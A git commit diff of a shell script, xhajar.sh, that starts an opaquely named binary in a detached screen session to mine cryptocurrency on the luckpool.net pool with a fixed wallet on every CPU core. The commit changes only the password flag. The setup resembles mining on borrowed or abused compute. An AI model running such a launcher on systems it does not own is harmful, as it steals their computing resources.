239ee06d0ca3452da6bdddf2e913f4c79e5acd7d
renilo <88342640+renilo@users.noreply.github.com>
2021-10-25 13:52:31 +0700

    Update xhajar.sh

--- xhajar.sh
+++ xhajar.sh
@@ -4,4 +4,4 @@ WALLET=RR6U3T7Uz475i7gontznFLWikFsQan2wjC
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)
 chmod +x meki-baru1
 
-screen -dmS running1 ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NOBAMBANK -p x -t $(nproc)
+screen -dmS running1 ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.NOBAMBANK -p x,xn=5f -t $(nproc)
